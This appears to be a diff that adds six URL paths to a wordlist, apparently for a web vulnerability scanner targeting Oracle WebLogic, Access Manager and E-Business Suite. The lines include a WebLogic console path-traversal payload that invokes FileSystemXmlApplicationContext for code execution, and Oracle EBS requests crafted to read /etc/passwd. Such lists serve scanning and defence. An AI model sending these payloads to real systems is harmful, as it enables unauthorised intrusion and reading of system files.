@@ -1,0 +1,6 @@
+/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(
+/console/login/LoginForm.jsp
+/manage/fileDownloader?sec=1
+/oam/server/opensso/sessionservice
+/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
+/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd
